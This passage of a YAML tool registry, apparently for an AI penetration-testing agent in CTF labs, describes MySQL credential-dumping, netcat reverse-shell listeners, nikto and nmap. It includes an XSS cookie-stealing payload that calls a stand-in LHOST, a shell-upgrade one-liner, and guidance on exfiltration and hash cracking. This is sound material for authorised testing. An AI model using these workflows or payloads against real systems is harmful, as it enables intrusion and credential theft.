            description: Query timeout in seconds.
        returns:
          rows:
            type: array
            description: 'Query results as array of {column: value} objects.'
          row_count:
            type: integer
            description: Number of rows returned.
      list_databases:
        description: List all databases on the MySQL server (SHOW DATABASES). Filters out system databases or includes them
          based on context.
        when_to_use: First step after gaining MySQL credentials. Shows all databases — look for application databases (wordpress,
          drupal, custom_app) vs system databases (mysql, information_schema, performance_schema, sys). Application databases
          often contain user credentials.
        params:
          host:
            type: string
            required: true
            description: MySQL server hostname or IP.
          username:
            type: string
            required: true
            description: MySQL username.
          password:
            type: string
            description: MySQL password.
          port:
            type: integer
            default: 3306
            description: MySQL port.
        returns:
          databases:
            type: array
            description: List of database names.
      list_tables:
        description: List all tables in a specific database (SHOW TABLES).
        when_to_use: 'After identifying an interesting database via list_databases. Look for tables named: users, accounts,
          credentials, admins, members, auth, sessions — these likely contain credentials. Also look for: posts, comments,
          messages — may contain sensitive data.'
        params:
          host:
            type: string
            required: true
            description: MySQL server hostname or IP.
          username:
            type: string
            required: true
            description: MySQL username.
          password:
            type: string
            description: MySQL password.
          database:
            type: string
            required: true
            description: Database name to list tables from.
          port:
            type: integer
            default: 3306
            description: MySQL port.
        returns:
          tables:
            type: array
            description: List of table names in the database.
      dump_table:
        description: Dump contents of a specific table with optional column filtering and row limit (default 100 rows). Builds
          a SELECT query from the parameters.
        when_to_use: To extract data from a table identified via list_tables or find_credentials. Use columns param to select
          only relevant columns (e.g., columns=['username','password'] to avoid dumping large text fields). Increase limit
          for full extraction. For large tables, use query method with specific WHERE clauses instead.
        params:
          host:
            type: string
            required: true
            description: MySQL server hostname or IP.
          username:
            type: string
            required: true
            description: MySQL username.
          password:
            type: string
            description: MySQL password.
          database:
            type: string
            required: true
            description: Database name.
          table:
            type: string
            required: true
            description: Table name to dump.
          columns:
            type: array
            description: Specific columns to select (e.g., ['username', 'password', 'email']). Omit for SELECT *.
          limit:
            type: integer
            default: 100
            description: Maximum number of rows to return.
          port:
            type: integer
            default: 3306
            description: MySQL port.
        returns:
          data:
            type: array
            description: 'Table rows as array of {column: value} objects.'
          row_count:
            type: integer
            description: Number of rows returned.
      find_credentials:
        description: 'Automatically search for tables containing credential-like data across one or all databases. Looks for
          tables with columns named: user, username, login, email, password, pass, pwd, hash, secret, token. Dumps matching
          rows.'
        when_to_use: Quick credential discovery — faster than manually checking each table. Run this first after list_databases
          to find low-hanging fruit. Found hashes can be cracked with john or looked up via hash-lookup. Specify database
          to narrow the search, or omit to scan all accessible databases.
        params:
          host:
            type: string
            required: true
            description: MySQL server hostname or IP.
          username:
            type: string
            required: true
            description: MySQL username.
          password:
            type: string
            description: MySQL password.
          database:
            type: string
            description: Database to search. Omit to search all accessible databases.
          port:
            type: integer
            default: 3306
            description: MySQL port.
        returns:
          tables:
            type: array
            description: Tables containing credential-like columns.
          credentials:
            type: array
            description: Extracted rows with username/password/hash data.
  netcat:
    name: netcat
    version: '2.0'
    description: 'Async networking server (Python, aiohttp) for TCP listeners, HTTP callback capture, UDP packet capture,
      and port testing. 14 methods across 3 transport types: TCP (listen with blocking/non-blocking modes, listener_status/read/write
      for interactive shell control, exec for one-shot capture, connect for bind shells), HTTP (http_listen with file serving
      and TLS/auto-cert, http_requests for captured request inspection, http_file for dynamic content), UDP (udp_listen, udp_packets,
      udp_send), plus check_port, get_interfaces (for LHOST), list, stop. TCP listeners support response templates (fake HTTP
      responses). HTTP server captures all requests with headers/cookies/query params. Auto-persists to /session/netcat/ when
      >50 requests or >100KB data. TLS support with auto-generated self-signed certs. Container includes netcat-traditional,
      ncat, socat, iproute2 as fallback tools.'
    image: ghcr.io/silicon-works/mcp-tools-netcat:latest
    image_size_mb: 150
    capabilities:
    - reverse_shell_listener
    - http_server
    - cookie_capture
    - xss_callback
    - csrf_hosting
    - udp_listener
    - bind_shell_connection
    - port_checking
    - network_debugging
    see_also:
    - shell-session
    - curl
    routing:
      use_for:
      - catch reverse shell connection from target
      - start HTTP server to capture XSS cookie callbacks
      - host CSRF exploit page for admin bot to visit
      - capture HTTP requests with headers cookies and query params
      - listen for UDP packets for DNS exfiltration or SNMP
      - connect to bind shell on target
      - check if port is open and grab service banner
      - get attacker IP address for LHOST in reverse shells
      - serve exploit files over HTTP or HTTPS
      never_use_for:
      - persistent SSH sessions (use shell-session)
      - complex HTTP requests with custom encoding (use curl)
      - port scanning (use nmap)
      triggers:
      - reverse shell
      - callback server
      - cookie capture
      - XSS callback
      - CSRF host
      - admin bot
      - netcat listener
      - catch shell
      - LHOST
    phases:
    - exploitation
    - post-exploitation
    requirements:
      network: true
      privileged: false
    resources:
      memory_mb: 256
      cpu: 0.5
    methods:
      listen:
        description: 'Start a TCP listener on the specified port for catching reverse shells or capturing incoming connections.
          Two modes: blocking (timeout>0) waits for a connection and returns initial data, non-blocking (timeout=0) returns
          immediately with a listener_id for polling via listener_status. Supports response templates — sends configured data
          upon connection (useful for faking HTTP responses). Binds on 0.0.0.0. Returns listener_id for interactive use with
          listener_read/listener_write.'
        when_to_use: 'The first step before triggering a reverse shell payload. Workflow: (1) get_interfaces to find LHOST,
          (2) listen on chosen port with timeout=0 for non-blocking, (3) Trigger the reverse shell (via curl inject, exploit-runner,
          etc.), (4) listener_status to check for connection, (5) listener_read/listener_write for interactive commands. Use
          timeout=300 (blocking) when you want to wait for the shell in one call. Use response param to fake an HTTP response
          for SSRF callbacks. For simple one-shot captures, use exec instead.'
        params:
          port:
            type: integer
            required: true
            description: 'Port to listen on. Use >1024 for non-privileged containers. Common ports: 4444, 9001, 8443.'
          timeout:
            type: integer
            default: 300
            description: Wait timeout in seconds. 0=non-blocking (returns immediately, use listener_status to poll). >0=blocking
              (waits for connection up to timeout seconds).
          response:
            type: string
            description: Data to send to the connecting client upon connection. Useful for faking HTTP responses in SSRF scenarios.
        returns:
          listener_id:
            type: string
            description: Unique listener ID (tcp_<hex>) for listener_status, listener_read, listener_write, and stop.
          port:
            type: integer
            description: Port listening on.
          status:
            type: string
            description: 'Listener status: ''listening'' (no connection yet) or ''connected'' (client connected).'
      listener_status:
        description: Check the current status of a TCP listener — whether it's still listening, has received a connection,
          or has been closed. Returns remote IP/port and any buffered data if connected.
        when_to_use: After starting a non-blocking listener (timeout=0), poll this to check if a reverse shell or other connection
          has arrived. Also useful to check if an existing connection is still alive before sending commands via listener_write.
        params:
          listener_id:
            type: string
            required: true
            description: Listener ID from listen() (tcp_<hex> format).
        returns:
          status:
            type: string
            description: 'Current status: ''listening'' (waiting), ''connected'' (client connected), or ''closed'' (connection
              ended).'
          remote_ip:
            type: string
            description: Connected client's IP address (only when status='connected').
      listener_read:
        description: Read data from a connected TCP client (up to 64KB per read). Appends to the listener's internal buffer.
          Returns the received data as text. If the remote end closes the connection, marks the listener as 'closed'.
        when_to_use: 'After a reverse shell connects, to read command output. Typical flow: listener_write(''id\n'') → listener_read()
          → see ''uid=0(root)''. Also useful for reading initial banners from services.'
        params:
          listener_id:
            type: string
            required: true
            description: Listener ID from listen().
          timeout:
            type: integer
            default: 30
            description: Read timeout in seconds. Increase for slow commands.
        returns:
          data:
            type: string
            description: Data received from the connected client.
      listener_write:
        description: Write data to a connected TCP client. Sends raw bytes (encoded as UTF-8). Returns the number of bytes
          sent. If the connection is closed, marks the listener as 'closed'.
        when_to_use: 'To send commands to a reverse shell. Remember to append ''\n'' to commands (e.g., data=''whoami\n'').
          For upgrading a shell: data=''python3 -c "import pty;pty.spawn(\"/bin/bash\")"\n''. Follow each write with a listener_read
          to capture the output.'
        params:
          listener_id:
            type: string
            required: true
            description: Listener ID from listen().
          data:
            type: string
            required: true
            description: Data to send to the connected client. Include '\n' for command execution.
        returns:
          bytes_sent:
            type: integer
            description: Number of bytes sent.
      exec:
        description: 'One-shot TCP capture: listen on a port, accept one connection, read all data until connection closes
          or 5s idle, then return everything. Uses blocking sockets (not async). Simpler than listen+read flow but no interactive
          control — you get all output at once after the connection ends.'
        when_to_use: For capturing one-shot command output (like 'id' or 'cat /etc/passwd') from a reverse connection, SSRF
          callbacks, or blind RCE confirmation. NOT suitable for interactive reverse shells — use listen + listener_read/listener_write
          for that. Also useful for capturing data exfiltration over TCP.
        params:
          port:
            type: integer
            required: true
            description: Port to listen on.
          timeout:
            type: integer
            default: 60
            description: Total timeout waiting for a connection.
        returns:
          output:
            type: string
            description: All data received from the connection.
          remote_ip:
            type: string
            description: Source IP of the connecting client.
      http_listen:
        description: Start an HTTP server (via aiohttp) that serves files and captures all incoming requests with full headers,
          cookies, query parameters, and POST body. Supports TLS with auto-generated self-signed certs or custom cert/key
          pairs. Auto-detects MIME types for served files. All requests are logged even for paths without files (returns 404
          but still captures). Auto-persists to /session/netcat/ when >50 requests or >100KB data. Keepalive timer (1-30 min)
          auto-stops idle servers.
        when_to_use: 'For CTF/HTB challenges that involve browser interaction: (1) XSS cookie stealing — host a page with
          ''<script>fetch("http://LHOST:PORT/?c="+document.cookie)</script>'', then check http_requests for the cookie, (2)
          CSRF exploitation — serve a malicious form that auto-submits to the target, (3) SSRF confirmation — start server
          and check if target makes a request, (4) Serve exploit payloads — host malicious .html, .js, or .xml files for the
          admin bot to fetch. Always call get_interfaces first to determine your LHOST for the URL.'
        params:
          port:
            type: integer
            required: true
            description: 'Port to listen on. Common: 80, 8080, 8443 (for HTTPS).'
          files:
            type: object
            description: 'Initial files to serve as {''/path'': ''content''} dict. Example: {''/index.html'': ''<script>...</script>'',
              ''/exploit.js'': ''fetch(...)''}. MIME type auto-detected from extension.'
          tls:
            type: boolean
            default: false
            description: Enable HTTPS. If cert/key not provided, generates a self-signed cert automatically.
          cert:
            type: string
            description: PEM certificate content (base64-encoded or raw PEM text) for custom TLS.
          key:
            type: string
            description: PEM private key content (base64-encoded or raw PEM text) for custom TLS.
          timeout:
            type: integer
            default: 0
            description: Server timeout in seconds. 0=runs indefinitely until stop() is called.
          keepalive:
            type: integer
            default: 5
            description: Keepalive timeout in minutes (1-30). Server auto-stops if no MCP calls within this period. Resets
              on every MCP call.
        returns:
          server_id:
            type: string
            description: Server ID (http_<hex>) for http_requests, http_file, and stop.
          url:
            type: string
            description: Full URL including detected LHOST IP (e.g., 'http://10.10.14.5:8080').
      http_requests:
        description: 'Retrieve all captured HTTP requests from an HTTP server. Each request includes: timestamp, method, path,
          query params, all headers (including cookies), POST body, source IP/port. Reads from both in-memory buffer and persisted
          JSONL file. Returns up to 50 requests inline; full dataset available in persisted file. Resets keepalive timer.'
        when_to_use: 'After the admin bot or target visits your HTTP server, to extract: (1) Cookies — look in headers[''Cookie'']
          for session tokens, (2) Query parameters — XSS callbacks like /?c=<cookie_value>, (3) POST body — form submissions
          from CSRF exploits, (4) Referrer and User-Agent for fingerprinting. Use since param to filter new requests only.
          Use clear=true to reset after processing.'
        params:
          server_id:
            type: string
            required: true
            description: Server ID from http_listen().
          since:
            type: string
            description: ISO timestamp filter — only return requests after this time.
          clear:
            type: boolean
            default: false
            description: Clear all captured requests after reading (both in-memory and persisted file).
        returns:
          requests:
            type: array
            description: 'Captured requests (up to 50), each with: timestamp, method, path, query, headers, body, source_ip,
              source_port.'
          request_count:
            type: integer
            description: Total number of requests (may exceed 50 inline limit).
          file:
            type: string
            description: Path to JSONL file with all requests (when >50 captured).
      http_file:
        description: Add, update, or remove a file on a running HTTP server. Set content to add/update a file, omit content
          to delete. MIME type is auto-detected from extension (.html→text/html, .js→application/javascript, .json→application/json,
          etc.) or can be set manually. Paths are automatically prefixed with '/' if missing.
        when_to_use: 'To dynamically change what the HTTP server serves without restarting it. Common uses: (1) Update XSS
          payload after first callback fails, (2) Add a new exploit page targeting a different endpoint, (3) Serve different
          CSRF forms for different targets, (4) Remove a file after it''s been fetched to avoid re-triggering.'
        params:
          server_id:
            type: string
            required: true
            description: Server ID from http_listen().
          path:
            type: string
            required: true
            description: URL path to serve the file at (e.g., '/exploit.html', '/api/data.json').
          content:
            type: string
            description: File content. Omit entirely to delete the file at this path.
          content_type:
            type: string
            description: MIME type override. Auto-detected from extension if omitted.
        returns:
          action:
            type: string
            description: '''updated'' (file added/changed) or ''deleted'' (file removed).'
      udp_listen:
        description: Start a UDP listener for capturing incoming packets. Non-blocking — returns immediately and packets accumulate
          in memory. Each packet is captured with source IP, source port, decoded text, and hex representation. Auto-persists
          to JSONL file when >50 packets.
        when_to_use: 'For capturing UDP-based data: (1) DNS exfiltration — listen on port 53, trigger DNS lookups from target
          with embedded data, (2) SNMP trap capture — listen on port 162, (3) Syslog capture — listen on port 514, (4) Confirming
          blind SSRF via DNS/UDP. After starting, use udp_packets to retrieve captured data.'
        params:
          port:
            type: integer
            required: true
            description: UDP port to listen on.
          timeout:
            type: integer
            default: 0
            description: Listener timeout in seconds. 0=runs indefinitely until stop().
        returns:
          listener_id:
            type: string
            description: Listener ID (udp_<hex>) for udp_packets and stop.
      udp_packets:
        description: Retrieve captured UDP packets from a listener. Each packet includes source IP, source port, decoded text
          data, and hex-encoded data. Returns up to 50 packets inline; full dataset persisted to JSONL file when threshold
          exceeded.
        when_to_use: After starting a UDP listener, to check what packets have been received. Use for DNS exfiltration decoding,
          SNMP data parsing, or confirming UDP-based SSRF. Use clear=true to reset the packet buffer.
        params:
          listener_id:
            type: string
            required: true
            description: Listener ID from udp_listen().
          clear:
            type: boolean
            default: false
            description: Clear all captured packets after reading.
        returns:
          packets:
            type: array
            description: 'Captured packets, each with: timestamp, source_ip, source_port, data (text), data_hex (hex).'
      udp_send:
        description: Send a single UDP packet to a remote host. Uses Python socket (not nc). Data is encoded as UTF-8.
        when_to_use: 'For UDP-based exploits, service testing, or triggering UDP-based vulnerabilities. Examples: sending
          crafted SNMP packets, DNS queries, or syslog messages.'
        params:
          host:
            type: string
            required: true
            description: Target hostname or IP.
          port:
            type: integer
            required: true
            description: Target UDP port.
          data:
            type: string
            required: true
            description: Data payload to send (encoded as UTF-8).
        returns:
          bytes_sent:
            type: integer
            description: Number of bytes sent.
      connect:
        description: Connect to a remote TCP host, optionally send data, read the response (up to 64KB, 10s read timeout),
          then close. Uses asyncio streams. Handles connection timeout, connection refused, and general errors.
        when_to_use: 'To connect to a bind shell on a target or interact with a raw TCP service. Use cases: (1) Connect to
          a bind shell planted by an exploit, (2) Send raw protocol data to test a service, (3) Grab a service banner by connecting
          and reading. For persistent interactive sessions, use listen (for reverse shells) or shell-session (for SSH).'
        params:
          host:
            type: string
            required: true
            description: Target hostname or IP.
          port:
            type: integer
            required: true
            description: Target TCP port.
          data:
            type: string
            description: Data to send immediately after connecting. Include '\n' for line-terminated protocols.
          timeout:
            type: integer
            default: 30
            description: Connection timeout in seconds.
        returns:
          response:
            type: string
            description: Response data from the remote host (up to 64KB).
      check_port:
        description: Quick TCP port connectivity check — connects, optionally grabs a service banner (2s timeout), then closes.
          Returns open/closed/filtered status. Does NOT perform full service detection like nmap.
        when_to_use: 'For quick port checks during exploitation: (1) Verify a service is running before attacking, (2) Confirm
          a port opened after exploitation (e.g., bind shell), (3) Check if a firewall rule was modified. Faster than nmap
          for single-port checks. Returns banner if the service sends one automatically.'
        params:
          host:
            type: string
            required: true
            description: Target hostname or IP.
          port:
            type: integer
            required: true
            description: Target TCP port.
          timeout:
            type: integer
            default: 5
            description: Connection timeout in seconds.
        returns:
          open:
            type: boolean
            description: Whether the port accepted a connection.
          banner:
            type: string
            description: Service banner (if the service sends one on connect).
      get_interfaces:
        description: Get non-loopback network interfaces with their IPv4 addresses from the container. Uses 'ip -j addr' for
          structured output. Essential for determining LHOST when setting up reverse shell payloads.
        when_to_use: Before creating reverse shell payloads — you need to know your IP address (LHOST). Call this first, then
          use the returned IP in exploit-runner generate_payload or in manual payload construction. The first non-loopback
          interface is typically the correct one (e.g., eth0 on HTB/CTF VPN).
        params: {}
        returns:
          interfaces:
            type: array
            description: 'Network interfaces, each with: interface name and IPv4 addresses.'
      list:
        description: List all active TCP listeners, HTTP servers, and UDP listeners with their current status, ports, and
          metadata.
        when_to_use: 'To check what listeners and servers are currently running. Useful for: (1) Finding the listener_id/server_id
          you forgot, (2) Checking if a listener is still active, (3) Cleaning up before starting a new listener on the same
          port.'
        params: {}
        returns:
          listeners:
            type: array
            description: 'All active listeners/servers with: id, type (tcp/http/udp), port, status, created_at.'
      stop:
        description: 'Stop a listener or server by its ID. For TCP listeners: closes the connection and returns buffered data.
          For HTTP servers: stops the aiohttp server and returns all captured requests (up to 50 inline). For UDP listeners:
          closes the transport and returns all captured packets.'
        when_to_use: To clean up listeners and free ports. Always stop listeners when done to avoid port conflicts. For HTTP
          servers, the stop response includes all captured requests — useful as a final check before cleanup.
        params:
          id:
            type: string
            required: true
            description: Listener/server ID to stop (tcp_<hex>, http_<hex>, or udp_<hex>).
        returns:
          type:
            type: string
            description: 'Type of stopped listener: ''tcp'', ''http'', or ''udp''.'
          requests:
            type: array
            description: Final captured requests/packets (for HTTP servers and UDP listeners).
  nikto:
    name: nikto
    version: '2.5'
    description: Web server vulnerability scanner that checks for 6,900+ vulnerability tests (plus 6,200+ Drupal-specific
      and 1,800+ dictionary checks), outdated server versions (Apache, nginx, IIS, Tomcat), and server-level misconfigurations
      including insecure HTTP methods, default credentials, and known CVEs with OSVDB references
    image: ghcr.io/silicon-works/mcp-tools-nikto:latest
    image_size_mb: 150
    capabilities:
    - web_vulnerability_scanning
    - server_misconfiguration
    - outdated_software_detection
    - technology_detection
    phases:
    - enumeration
    requirements:
      network: true
      privileged: false
    resources:
      memory_mb: 256
      cpu: 0.5
    routing:
      use_for:
      - web server vulnerability scanning
      - server misconfiguration detection
      - outdated software detection
      - web server fingerprinting
      - dangerous default files and backup file detection
      - insecure HTTP headers and methods check
      - Apache nginx IIS Tomcat version vulnerability check
      - server-level CVE and OSVDB detection
      - CGI vulnerability scanning
      - web server security audit
      never_use_for:
      - port scanning
      - SQL injection
      - password cracking
      - directory brute-forcing
      triggers:
      - nikto
      - web server scan
      - server misconfiguration
      - outdated server
    methods:
      scan:
        description: Scan a web server for known vulnerabilities including outdated server software (Apache, nginx, IIS, Tomcat,
          lighttpd), dangerous default files (phpinfo.php, .git, .svn, server-status, server-info, backup files, database
          dumps), insecure HTTP methods (PUT, DELETE, TRACE, CONNECT), server misconfigurations (directory listing, default
          credentials, exposed admin consoles), and known CVEs with OSVDB cross-references. Uses a database of 6,900+ checks
          (plus 6,200+ Drupal-specific checks) organized by vulnerability category.
        when_to_use: After discovering HTTP/HTTPS service on a port (from nmap) to check for server-level vulnerabilities
          like outdated server versions, dangerous default files, insecure HTTP headers, exposed admin interfaces, and known
          CVEs against the server software. Complements nuclei which focuses on template-based application-level CVE scanning.
          Use nikto for broad server-level checks and default file/misconfiguration discovery, nuclei for specific CVE verification,
          and zap for deep application-level active scanning.
        params:
          target:
            type: string
            required: true
            description: Target URL or IP:port (e.g., 'http://10.10.10.1', '10.10.10.1:8080', 'https://target.htb')
          tuning:
            type: string
            description: 'Focus scan on specific check categories. Values: 0=file upload, 1=interesting file/log, 2=misconfiguration/default
              file, 3=information disclosure, 4=injection (XSS/script/HTML), 5=remote file retrieval (inside web root), 6=denial
              of service (avoid in engagements), 7=remote file retrieval (server-wide), 8=command execution/remote shell,
              9=SQL injection, a=authentication bypass, b=software identification, c=remote source inclusion, d=WebService,
              e=administrative console, x=reverse tuning (exclude selected categories instead of including). Combine multiple
              (e.g., ''1234'' for web app focus, ''89'' for command exec + SQLi, ''12ab'' for files + misconfig + auth bypass
              + software ID). Default: all categories'
          ssl:
            type: boolean
            default: false
            description: Force SSL/TLS connection. Use when target serves HTTPS on a non-standard port or when you want to
              explicitly test the SSL endpoint
          timeout:
            type: integer
            default: 300
            description: 'Subprocess timeout in seconds (note: max_time controls the actual nikto scan duration)'
          max_time:
            type: integer
            default: 600
            description: Maximum total scan duration in seconds. Increase for thorough scans of large sites (e.g., 1800 for
              30 minutes)
        returns:
          findings:
            type: array
            description: List of vulnerabilities and interesting findings, each with description text, optional OSVDB reference
              ID, and discovered path
          server_info:
            type: object
            description: Server information including server software banner, target IP, hostname, and port
  nmap:
    name: nmap
    version: '7.98'
    description: Network scanner (v7.98) for port discovery, service/version detection, OS fingerprinting, and NSE script-based
      vulnerability scanning. Supports TCP SYN/Connect/ACK/UDP scan types, 613 NSE scripts across categories (vuln, exploit,
      brute, auth, default, discovery, safe), timing templates T0-T5, and XML output parsing. Compiled with libssh2, openssl,
      lua 5.4. Requires privileged mode for SYN scans, UDP scans, and OS detection.
    image: ghcr.io/silicon-works/mcp-tools-nmap:latest
    image_size_mb: 150
    capabilities:
    - port_scanning
    - service_detection
    - os_fingerprinting
    - vulnerability_scanning
    - host_discovery
    routing:
      use_for:
      - port scanning and open port discovery
      - service and version detection on open ports
      - OS fingerprinting and operating system identification
      - host discovery and ping sweep
      - network enumeration and initial reconnaissance
      - NSE vulnerability script scanning
      - TCP SYN UDP ACK scan types
      - determine what services are running on a target
      - find open ports on IP address or CIDR range
      - identify local network interfaces and LHOST IP
      never_use_for:
      - web fuzzing (use ffuf)
      - SQL injection (use sqlmap)
      - password cracking (use hydra or john)
      triggers:
      - nmap
      - port scan
      - service detection
      - OS fingerprint
      - host discovery
      - network scan
      - open ports
      - what services
      prefer_over:
      - masscan
    phases:
    - reconnaissance
    - enumeration
    requirements:
      network: true
      privileged: true
      privileged_reason: Raw socket access for SYN scans, OS detection, and packet manipulation
    resources:
      memory_mb: 256
      cpu: 0.5
    methods:
      port_scan:
        description: Scan for open ports on a target using the specified scan technique. Runs nmap with XML output parsing.
          Supports TCP Connect (-sT, unprivileged), SYN stealth (-sS, requires privileged), UDP (-sU, requires privileged,
          slower), and ACK (-sA, requires privileged, for firewall rule detection). Results include port number, state (open/closed/filtered),
          protocol, and basic service name.
        when_to_use: The very first step in any engagement — run this to discover what ports are open and what services are
          exposed. Use tcp_connect scan type if running unprivileged, syn for faster stealth scanning with privileges. Scan
          common ports first (default 1-1000), then expand to all 65535 if needed. For targets behind a firewall that filter
          ICMP, the scan may report 'host down' — use skip_discovery=true (-Pn) to bypass host discovery and scan anyway.
          Follow up open ports with service_scan for version detection.
        requires_privileged:
          tcp_connect: false
          syn: true
          udp: true
          ack: true
        params:
          target:
            type: string
            required: true
            description: IP address, hostname, or CIDR range (e.g., '10.10.10.1', 'target.htb', '192.168.1.0/24'). For CIDR
              ranges, all hosts in the range are scanned.
          ports:
            type: string
            default: 1-1000
            description: 'Port specification. Formats: single port ''80'', list ''22,80,443,8080'', range ''1-1000'', all
              ''1-65535'', combined ''T:80,443,U:53,161'' (TCP and UDP). Default scans ports 1-1000. Use ''1-65535'' for comprehensive
              scan (slower). Common quick targets: ''21,22,23,25,53,80,110,111,135,139,143,443,445,993,995,1723,3306,3389,5900,8080''.'
          scan_type:
            type: enum
            values:
            - tcp_connect
            - syn
            - udp
            - ack
            default: tcp_connect
            description: 'Scan technique: ''tcp_connect'' (-sT, completes TCP handshake, unprivileged, logged by target),
              ''syn'' (-sS, half-open stealth scan, requires privileged, faster and less detectable), ''udp'' (-sU, UDP scan,
              requires privileged, much slower — combine with specific ports), ''ack'' (-sA, ACK scan, requires privileged,
              maps firewall rules, does NOT find open ports — only filtered/unfiltered).'
          timing:
            type: enum
            values:
            - paranoid
            - sneaky
            - polite
            - normal
            - aggressive
            - insane
            default: normal
            description: 'Timing template: ''paranoid'' (T0, IDS evasion, very slow), ''sneaky'' (T1, IDS evasion), ''polite''
              (T2, less bandwidth), ''normal'' (T3, default), ''aggressive'' (T4, faster, assumes reliable network — recommended
              for HTB/labs), ''insane'' (T5, fastest, may miss ports on unreliable networks).'
          skip_discovery:
            type: boolean
            default: false
            description: Skip host discovery (-Pn). Use when target filters ICMP and nmap reports 'host seems down'. Common
              in HTB and firewalled environments.
          top_ports:
            type: integer
            description: 'Scan the N most common ports instead of a range. Mutually exclusive with ''ports''. Common values:
              100 (fast), 1000 (thorough).'
        returns:
          open_ports:
            type: array
            description: List of open port numbers (convenience summary)
          hosts:
            type: array
            description: 'Full scan results per host with ports array (each port has: port, protocol, state, service name)'
          summary:
            type: object
            description: Scan summary with target, open_ports list, and total_open count
      service_scan:
        description: 'Probe open ports to identify service names, product names, and version numbers using nmap''s -sV flag.
          Sends service-specific probes and matches responses against nmap''s signature database. Returns structured service
          info: service name (e.g., ''http'', ''ssh''), product (e.g., ''Apache httpd'', ''OpenSSH''), version (e.g., ''2.4.41'',
          ''8.2p1''), and extra info (e.g., ''Ubuntu 4ubuntu0.3'', ''protocol 2.0''). Timeout is 600s (10 min) as version
          detection can be slow.'
        when_to_use: 'After port_scan identifies open ports. Version information is critical for: finding CVEs (e.g., Apache
          2.4.49 → CVE-2021-41773), choosing exploit tools, identifying technology stack. Always run this on all discovered
          open ports before moving to vulnerability scanning. Pass the open ports from port_scan results as a comma-separated
          list.'
        requires_privileged: true
        params:
          target:
            type: string
            required: true
            description: IP address or hostname
          ports:
            type: string
            required: true
            description: 'Ports to probe (from port_scan results). Comma-separated or range: ''22,80,443,8080'' or ''1-1000''.
              Only scan ports that were found open — scanning closed ports wastes time.'
          skip_discovery:
            type: boolean
            default: false
            description: Skip host discovery (-Pn). Use when target filters ICMP and nmap reports 'host seems down'.
          version_intensity:
            type: integer
            description: Version detection probe intensity 0-9. Default uses nmap's default 7. Use 2 for fast scan, 9 for
              thorough.
        returns:
          services_summary:
            type: array
            description: 'Service details per port: port number, protocol, service name, product, version, and extrainfo'
          hosts:
            type: array
            description: Full nmap XML-parsed results per host
      os_detection:
        description: Detect the target's operating system using nmap's TCP/IP fingerprinting (-O --osscan-guess). Sends specially
          crafted packets and analyzes responses to match against nmap's OS signature database. Returns ranked OS matches
          with confidence percentages. Requires at least one open and one closed port for reliable results. Requires privileged
          mode for raw socket access.
        when_to_use: 'After port_scan to identify the target OS. Useful for: choosing OS-specific exploits, identifying kernel
          version range (for kernel exploits like Dirty Pipe), distinguishing Linux distributions, and identifying Windows
          versions. Best results when the target has both open and closed ports visible. If results are inconclusive, service_scan
          banners often reveal the OS (e.g., ''Ubuntu'' in OpenSSH version string).'
        requires_privileged: true
        params:
          target:
            type: string
            required: true
            description: IP address or hostname (single target — OS detection doesn't work well with CIDR ranges)
          skip_discovery:
            type: boolean
            default: false
            description: Skip host discovery (-Pn). Use when target filters ICMP and nmap reports 'host seems down'.
        returns:
          os_summary:
            type: object
            description: Best OS match with 'best_match' (name string), 'confidence' (accuracy percentage), and 'all_matches'
              (array of all OS matches ranked by confidence)
          hosts:
            type: array
            description: Full nmap XML-parsed results including os_matches array
      vuln_scan:
        description: 'Run NSE (Nmap Scripting Engine) scripts against a target with service version detection (-sV). Nmap
          has 613 NSE scripts across categories: ''vuln'' (vulnerability checks with CVE references), ''exploit'' (active
          exploitation attempts), ''brute'' (brute-force login attacks), ''auth'' (authentication bypass checks), ''default''
          (safe default scripts, same as -sC), ''discovery'' (active service enumeration), ''safe'' (non-intrusive information
          gathering). Scripts can also be specified individually (e.g., ''http-shellshock'', ''smb-vuln-ms17-010''). Timeout
          is 900s (15 min) as scripts can be slow. Results are filtered for findings containing ''vulnerable'', ''CVE-'',
          ''exploit'', ''critical'', or ''high''.'
        when_to_use: 'After service_scan identifies specific services and versions. Use the ''vuln'' category for general
          vulnerability scanning. For targeted checks, use specific scripts: ''smb-vuln-ms17-010'' (EternalBlue), ''http-shellshock''
          (Shellshock), ''ssl-heartbleed'' (Heartbleed), ''http-vuln-cve2017-5638'' (Struts2). Can combine categories: ''vuln
          and safe'' for non-intrusive vuln checks. For web-specific vulnerabilities, prefer nuclei which has more templates.
          NSE vuln scanning is best for: SMB vulnerabilities, SSL/TLS issues, and service-specific CVEs.'
        requires_privileged: true
        params:
          target:
            type: string
            required: true
            description: IP address or hostname
          ports:
            type: string
            required: true
            description: Ports to scan (from port_scan/service_scan results)
          scripts:
            type: string
            default: vuln
            description: 'NSE script specification. Categories: ''vuln'' (vulnerability detection), ''exploit'' (active exploitation),
              ''brute'' (brute-force), ''auth'' (auth bypass), ''default'' (safe defaults), ''discovery'' (enumeration), ''safe''
              (non-intrusive). Specific scripts: ''smb-vuln-ms17-010'', ''http-shellshock'', ''ssl-heartbleed'', ''ftp-anon''.
              Combine with ''and''/''or''/''not'': ''vuln and safe'', ''smb-vuln-*''. Comma-separated for multiple: ''http-shellshock,http-vuln-cve2017-5638''.'
          script_args:
            type: string
            description: Arguments for NSE scripts (e.g., 'userdb=users.txt,passdb=pass.txt' for brute scripts)
          skip_discovery:
            type: boolean
            default: false
            description: Skip host discovery (-Pn). Use when target filters ICMP and nmap reports 'host seems down'.
        returns:
          vulnerabilities:
            type: array
            description: 'Findings flagged as vulnerabilities, each with: port number, script ID, and full script output (including
              CVE references, exploit details)'
          vuln_count:
            type: integer
            description: Number of vulnerability findings detected
          hosts:
            type: array
            description: Full nmap XML-parsed results including all script outputs (not just vulnerabilities)
      ping_scan:
        description: Discover live hosts on a network without port scanning (-sn). Sends ICMP echo, TCP SYN to 443, TCP ACK
          to 80, and ICMP timestamp probes. Returns list of hosts that responded with their IP addresses.
        when_to_use: For network host discovery before individual port scans. Use on CIDR ranges (e.g., '192.168.1.0/24')
          to find which IPs are alive before spending time on port scanning each one.
        params:
          target:
            type: string
            required: true
            description: CIDR range or target (e.g., '192.168.1.0/24', '10.10.10.0/24')
          timing:
            type: enum
            values:
            - paranoid
            - sneaky
            - polite
            - normal
            - aggressive
            - insane
            default: normal
            description: Timing template
        returns:
          live_hosts:
            type: array
            description: IP addresses of hosts that responded
          total_live:
            type: integer
            description: Number of live hosts discovered
      get_interfaces:
        description: Get local network interfaces and IP addresses using 'ip -j addr'. Returns all interfaces with their IPv4/IPv6
          addresses, MAC addresses, and link state. Automatically identifies the best LHOST candidate (first non-loopback
          IPv4 address). Does NOT require network access or privileged mode.
